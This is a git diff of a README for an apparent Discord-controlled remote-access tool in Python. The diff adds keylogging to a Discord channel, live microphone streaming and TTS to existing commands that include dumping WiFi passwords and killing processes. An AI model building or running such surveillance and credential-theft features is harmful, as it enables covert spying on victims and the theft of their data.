@@ -1,7 +1,7 @@
 ## _Notice:_
-_Everything in the Code is German yet... i will translate it soon, sry_
+_Everything in the Code is German yet (except the !help command)... i will translate it soon, sry_
 
-_The Code is still in the Beta, i started making it like 2 days ago._
+_The Code is still in the Beta, i started making it like 1 day before i uploaded it here._
 
 _The Code is pretty unreadable bcs everything is one file. Thats on purpose bcs i dont want to have the pain with multiple Files in PyInstaller. I wont add a Builder or something because then tooo skiddy people are gonna use it_
 
@@ -28,6 +28,9 @@ This Python Programm basically hosts a discord bot on the Computer its executed 
 - **System Info:** Retrieve system information.
 - **Task Management:** List and kill processes.
 - **Purge Messages:** Clear bot messages and commands in the channel.
+- **Live Stream Mic:** Livestream the Computers Microphone to a discord voice channel.
+- **Keylogger** Log keystrokes and sends them to a Discord channel
+- **TTS** Play Text To Speech Messages on the Computer
 
 ## Requirements
 
@@ -52,13 +55,15 @@ This Python Programm basically hosts a discord bot on the Computer its executed 
     - `YOUR_BOT_TOKEN`: Your Discord bot token.
     - `YOUR_GUILD_ID`: Your Discord guild (server) ID.
     - `YOUR_USER_ID`: Your Discord user ID(s) who are authorized to control the bot.
+	- `channel_ids['voice']`: The ID of an Voice Channel on your Server
 
 ## Configuration
 
 Update the following variables in the script:
-- `TOKEN`: The token for your Discord bot.
-- `GUILD_ID`: The ID of the guild where the bot will operate.
-- `AUTHORIZED_USERS`: A list of user IDs that are authorized to control the bot.
+- `TOKEN`: The token for your Discord bot. _Line 2_
+- `GUILD_ID`: The ID of the guild where the bot will operate. _Line 4_
+- `AUTHORIZED_USERS`: A list of user IDs that are authorized to control the bot. _Line 7_
+- `channel_ids['voice']`: The ID of an Voice Channel on your Server. _Line 175_
 
 ## Running the Bot
 
@@ -66,6 +71,8 @@ To run the bot, execute the script:
 ```sh
 python your_script_name.py
 ```
+
+Hier ist die aktualisierte Tabelle, die die zusätzlichen Commands enthält:
 
 ## Commands
 
@@ -84,11 +91,14 @@ python your_script_name.py
 | `!admin`                     | Requests admin rights.                                                                              |
 | `!stop`                      | Stops the bot.                                                                                      |
 | `!wifi`                      | Shows WiFi profiles and passwords.                                                                  |
-| `!system_info`               | Shows system information.                                                                           |
-| `!cpu_usage`                 | Shows current CPU usage.                                                                            |
+| `!system_info`               | Shows system information.                                                                           |                                                                         |
 | `!taskkill <pid>`            | Terminates a process with the specified PID.                                                        |
 | `!purge`                     | Deletes the bot messages and commands.                                                              |
 | `!help`                      | Displays a list of available commands.                                                              |
+| `!tts <message>`             | Plays a custom text-to-speech message.                                                              |
+| `!mic_stream_start`          | Starts a live stream of the microphone to a voice channel.                                          |
+| `!mic_stream_stop`           | Stops the mic stream if activated.                                                                  |
+| `!keylog <on/off>`           | Activates or deactivates keylogging.                                                                |                                                       |
 
 ### Example Usage
 
